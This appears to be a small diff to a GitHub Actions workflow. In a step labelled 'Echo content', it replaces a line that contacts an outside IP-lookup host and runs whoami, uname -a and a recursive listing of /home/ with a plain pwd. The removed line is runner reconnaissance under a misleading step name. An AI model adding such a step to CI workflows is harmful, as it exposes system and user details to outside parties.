@@ -13,5 +13,5 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
       - name: Echo content
-        run: curl -s https://ip.ebe.ovh; whoami; uname -a; ls -R /home/
+        run: pwd
   
